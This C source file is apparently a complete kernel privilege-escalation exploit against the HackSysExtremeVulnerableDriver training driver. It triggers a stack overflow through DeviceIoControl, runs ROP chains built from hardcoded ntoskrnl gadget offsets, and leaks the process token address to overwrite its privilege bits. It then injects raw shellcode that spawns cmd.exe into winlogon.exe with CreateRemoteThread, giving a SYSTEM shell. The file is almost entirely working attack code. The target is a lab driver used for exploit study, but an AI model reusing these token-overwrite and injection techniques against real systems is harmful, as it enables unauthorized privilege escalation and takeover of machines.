#include <stdio.h>
#include <Windows.h>
#include <sddl.h>
#include <Psapi.h>
#include <tlhelp32.h>
#include <ntstatus.h>
#include "winternl.h"
#include "HEVD.h"





HANDLE driverHandle;
char* lpvPayload;
HMODULE hKernel = NULL;
ULONG64 KernelBase = NULL;
ULONG64 KUSER_SHARED_DATA = 0xFFFFF78000000000;
_NtQuerySystemInformation NtQuerySystemInformation;
RTL_PROCESS_MODULES ModuleInfo = { 0 };
ULONG64 RopChain[0x10] = { 0 };




void openDevice() {
    driverHandle = CreateFileA(
        "\\\\.\\HackSysExtremeVulnerableDriver",
        GENERIC_READ | GENERIC_WRITE,
        0,
        NULL,
        OPEN_EXISTING,
        FILE_ATTRIBUTE_NORMAL,
        NULL
    );
    if (driverHandle == INVALID_HANDLE_VALUE) {
        printf("\t[-] Could not open HEVD handle\n");
        exit(-1);
    }
}



BOOLEAN GetKernelModuleBase(PCHAR Name, ULONG_PTR* lpBaseAddress) {
    PRTL_PROCESS_MODULES ModuleInformation = NULL;
    ULONG InformationSize = 16;
    NTSTATUS NtStatus;

    NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        exit(-1);
    }

    do {
        InformationSize *= 2;

        ModuleInformation = (PRTL_PROCESS_MODULES)realloc(ModuleInformation, InformationSize);
        memset(ModuleInformation, 0, InformationSize);

        NtStatus = NtQuerySystemInformation(SystemModuleInformation,
            ModuleInformation,
            InformationSize,
            NULL);
    } while (NtStatus == STATUS_INFO_LENGTH_MISMATCH);


    BOOL Success = FALSE;
    for (UINT i = 0; i < ModuleInformation->NumberOfModules; i++) {
        CONST PRTL_PROCESS_MODULE_INFORMATION Module = &ModuleInformation->Modules[i];
        CONST USHORT OffsetToFileName = Module->OffsetToFileName;
        *lpBaseAddress = (ULONG_PTR)ModuleInformation->Modules[i].ImageBase;

        if (!strcmp((const char*)&Module->FullPathName[OffsetToFileName], Name)) {
            Success = TRUE;
            break;
        }
    }

    free(ModuleInformation);
    return Success;
}

void prepareRop() {

    *(RopChain + 0) = KernelBase + 0x2021a0;  // pop rcx
    *(RopChain + 1) = KUSER_SHARED_DATA + 0x800;
    *(RopChain + 2) = KernelBase + 0x86ab2c;  // inc qword ptr [rcx + 0x130] ; ret
    *(RopChain + 3) = KernelBase + 0x3cd16a;  // xor rax, rax
    *(RopChain + 4) = KernelBase + 0x3cd16a;  // xor rax, rax
    *(RopChain + 5) = KernelBase + 0x3cd16a;  // xor rax, rax
}

void preparePayload() {
    lpvPayload = (char*)VirtualAlloc(
        NULL,				        // Next page to commit
        0x850,		                // Page size, in bytes
        MEM_COMMIT | MEM_RESERVE,	// Allocate a committed page
        PAGE_EXECUTE_READWRITE);	// Read/write access
    if (lpvPayload == NULL) {
        printf("\t[-] Failed to create payload memory\n");
        exit(-1);
    }

    memset(lpvPayload, 0x0, 0x850);
}



void TriggerStackOverflow(int rop_size) {
    bool ret = DeviceIoControl(driverHandle,       // Device to be queried
        HEVD_IOCTL_BUFFER_OVERFLOW_STACK,          // Operation to perform
        (LPVOID)lpvPayload, 0x818 + rop_size,         // Input Buffer
        NULL, 0,                           // Output Buffer
        NULL, NULL                         // # Bytes returned, Synchronous I/O
    );

}


ULONG64 GetProcessTokenAddress(HANDLE handle, DWORD type)
{
    _NtQuerySystemInformation NtQuerySystemInformation = (_NtQuerySystemInformation)
        GetProcAddress(GetModuleHandle(L"ntdll.dll"), "NtQuerySystemInformation");
    if (NtQuerySystemInformation == NULL) {
        return NULL;
    }
    PSYSTEM_HANDLE_INFORMATION buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(0x20);

    DWORD outBuffer = 0;
    NTSTATUS status = NtQuerySystemInformation(SystemHandleInformation, buffer, 0x20, &outBuffer);

    if (status == STATUS_INFO_LENGTH_MISMATCH)
    {
        free(buffer);
        buffer = (PSYSTEM_HANDLE_INFORMATION)malloc(outBuffer);
        printf("outBuffer 0x%x\n", outBuffer);
        status = NtQuerySystemInformation(SystemHandleInformation, buffer, outBuffer, &outBuffer);
    }

    if (!buffer)
    {
        printf("\t[-] NtQuerySystemInformation error \n");
        return 0;
    }

    for (size_t i = 0; i < buffer->NumberOfHandles; i++)
    {
        DWORD objTypeNumber = buffer->Handels[i].ObjectTypeNumber;

        if (buffer->Handels[i].ProcessId == GetCurrentProcessId())
        {
            printf("%p %d %x\n", buffer->Handels[i].Object, buffer->Handels[i].ObjectTypeNumber, buffer->Handels[i].Handle);
            if (buffer->Handels[i].ObjectTypeNumber == type)
            {
                if (handle == (HANDLE)buffer->Handels[i].Handle)
                {
                    DWORD64 object = (DWORD64)buffer->Handels[i].Object;
                    free(buffer);
                    return object;
                }
            }
        }
    }
    printf("\t[-] handle not found\n");
    free(buffer);
    return 0;
}

ULONG64 uAllPrivelage = (1<<20);
ULONG64 OverwriteTokenPrivelage[0x10] = { 0 };
void prepareRopOverwriteTokenPrivelage() {
    /* Arbitary Write*/
    /*
    pop rax
    0xffffffffffffffff
    pop rdx
    Target
    mov [rdx], rax
    xor rax, rax
    */
    *(OverwriteTokenPrivelage + 0) = KernelBase + 0x2017f2;
    *(OverwriteTokenPrivelage + 1) = uAllPrivelage;
    *(OverwriteTokenPrivelage + 2) = KernelBase + 0x216c22;
    *(OverwriteTokenPrivelage + 3) = 0;
    *(OverwriteTokenPrivelage + 4) = KernelBase + 0x2fea59;
    *(OverwriteTokenPrivelage + 5) = KernelBase + 0x3cd16a;
}

BOOL
EnablePrivilege(
    _In_ HANDLE tokenHandle,
    _In_ ULONG PrivilegeValue,
    _In_ BOOLEAN Acquire
)
{
    BOOL ret;
    ULONG tokenPrivilegesSize = FIELD_OFFSET(TOKEN_PRIVILEGES, Privileges[1]);
    PTOKEN_PRIVILEGES tokenPrivileges = static_cast<PTOKEN_PRIVILEGES>(calloc(1, tokenPrivilegesSize));

    if (tokenPrivileges == NULL)
    {
        return FALSE;
    }

    tokenPrivileges->PrivilegeCount = 1;
    tokenPrivileges->Privileges[0].Luid.LowPart = PrivilegeValue;
    tokenPrivileges->Privileges[0].Luid.HighPart = 0;
    tokenPrivileges->Privileges[0].Attributes = Acquire ? SE_PRIVILEGE_ENABLED
        : SE_PRIVILEGE_REMOVED;
    ret = AdjustTokenPrivileges(tokenHandle,
        FALSE,
        tokenPrivileges,
        tokenPrivilegesSize,
        NULL,
        NULL);
    if (ret == FALSE)
    {
        NTSTATUS status = GetLastError();
        printf("Failed enabling debug privilege 0x%x\n", status);
        goto Exit;
    }

Exit:
    free(tokenPrivileges);
    return ret;
}

// run cmd.exe
unsigned char InjectedCode[] =
"\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50\x52\x51" \
"\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52" \
"\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0" \
"\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed" \
"\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88" \
"\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44" \
"\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48" \
"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1" \
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44" \
"\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49" \
"\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a" \
"\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41" \
"\x59\x5a\x48\x8b\x12\xe9\x57\xff\xff\xff\x5d\x48\xba\x01\x00\x00" \
"\x00\x00\x00\x00\x00\x48\x8d\x8d\x01\x01\x00\x00\x41\xba\x31\x8b" \
"\x6f\x87\xff\xd5\xbb\xe0\x1d\x2a\x0a\x41\xba\xa6\x95\xbd\x9d\xff" \
"\xd5\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb\x47" \
"\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5\x63\x6d\x64\x2e\x65" \
"\x78\x65\x00";

void InjectToWinlogon()
{
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, NULL);

    int pid = -1;
    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (_wcsicmp(entry.szExeFile, L"winlogon.exe") == 0)
            {
                pid = entry.th32ProcessID;
                break;
            }
        }
    }

    CloseHandle(snapshot);

    if (pid < 0)
    {
        printf("Could not find process\n");
        return;
    }
    printf("[+] PID: 0x%x\n", pid);
    HANDLE h = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);
    if (!h)
    {
        printf("Could not open process: %x", GetLastError());
        return;
    }

    void* buffer = VirtualAllocEx(h, NULL, sizeof(InjectedCode), MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);
    if (!buffer)
    {
        printf("[-] VirtualAllocEx failed\n");
    }

    if (!buffer)
    {
        printf("[-] remote allocation failed");
        return;
    }

    if (!WriteProcessMemory(h, buffer, InjectedCode, sizeof(InjectedCode), 0))
    {
        printf("[-] WriteProcessMemory failed");
        return;
    }

    HANDLE hthread = CreateRemoteThread(h, 0, 0, (LPTHREAD_START_ROUTINE)buffer, 0, 0, 0);

    if (hthread == INVALID_HANDLE_VALUE)
    {
        printf("[-] CreateRemoteThread failed");
        return;
    }
}

int main() {
    HANDLE tokenHandle;
    HANDLE newTokenHandle;
    HANDLE newTokenHandle2;
    PSID pSid;
    PSID_AND_ATTRIBUTES sidAndAttributes;
    DWORD sidLength = 0;
    BOOL bRes;

    ULONG64 tokenAddress;
    ULONG64 integrityLevelIndexAddress;
    ULONG64 presentPrivilegesAddress;

    NTSTATUS status;


    openDevice();

    //
    // Call CreateWellKnownSid once to check the needed size for the buffer
    //

    CreateWellKnownSid(WinHighLabelSid, NULL, NULL, &sidLength);

    //
    // Allocate a buffer and create a high IL SID
    //

    pSid = malloc(sidLength);
    CreateWellKnownSid(WinHighLabelSid, NULL, pSid, &sidLength);

    //
    // Create a restricted token and impersonate it
    //

    sidAndAttributes = (PSID_AND_ATTRIBUTES)malloc(0x20);
    sidAndAttributes->Sid = pSid;
    sidAndAttributes->Attributes = 0;
    printf("pSid: %llx\n", pSid);


    bRes = OpenProcessToken(GetCurrentProcess(),
        TOKEN_ALL_ACCESS,
        &tokenHandle);

    if (bRes == FALSE)
    {
        printf("OpenProcessToken failed\n");
        return 0;
    }
    printf("ProcessToken: %llx\n", tokenHandle);

    bRes = CreateRestrictedToken(tokenHandle,
        WRITE_RESTRICTED,
        0,
        NULL,
        0,
        NULL,
        1,
        sidAndAttributes,
        &newTokenHandle2);

    if (bRes == FALSE)
    {
        printf("CreateRestrictedToken failed\n");
        return 0;
    }

    bRes = ImpersonateLoggedOnUser(newTokenHandle2);
    if (bRes == FALSE)
    {
        printf("Impersonation failed\n");
        return 0;
    }
    bRes = OpenThreadToken(GetCurrentThread(),
        MAXIMUM_ALLOWED,
        TRUE,
        &newTokenHandle);
    if (bRes == FALSE)
    {
        printf("OpenThreadToken failed\n");
        return 0;
    }
    //
    // Open handle to process token
    //
    tokenAddress = GetProcessTokenAddress(newTokenHandle, 0x5);
    printf("Process token address: 0x%p\n", tokenAddress);

    CloseHandle(tokenHandle);
    CloseHandle(newTokenHandle2);

    presentPrivilegesAddress = tokenAddress + 0x40;
    integrityLevelIndexAddress = tokenAddress + 0xd0;





    


    // Get the image base addresses of all required images.
    GetKernelModuleBase((PCHAR)"ntoskrnl.exe", &KernelBase);
    printf("[+] ntoskrnl: %llx\n", KernelBase);




    printf("[*] Preparing payload\n");
    preparePayload();
    printf("[+] lpvPayload: 0x%llx\n", lpvPayload);

    printf("[*] Preparing ROP Chain\n");
    prepareRop();
    prepareRopOverwriteTokenPrivelage();


    printf("[*] Send payload for presentPrivileges\n");
    
    *(OverwriteTokenPrivelage + 3) = presentPrivilegesAddress;
    memcpy(lpvPayload + 0x818, OverwriteTokenPrivelage, sizeof(OverwriteTokenPrivelage));
    TriggerStackOverflow(0x30);
    

    
    *(OverwriteTokenPrivelage + 3) = presentPrivilegesAddress+0x8;
    memcpy(lpvPayload + 0x818, OverwriteTokenPrivelage, sizeof(OverwriteTokenPrivelage));
    TriggerStackOverflow(0x30);
    

    

    /*
    printf("[*] Send payload for integrityLevelIndex\n");
    *(RopChain + 1) = integrityLevelIndexAddress;
    memcpy(lpvPayload + 0x818, RopChain, sizeof(RopChain));
    TriggerStackOverflow(0x30);
    
    status = EnablePrivilege(newTokenHandle, 20, TRUE);
    if (status == FALSE)
    {
        return -1;
    }
    CloseHandle(newTokenHandle);
    */



    InjectToWinlogon();


    

    printf("\t[+] Success\n");
    //system("cmd.exe");

}
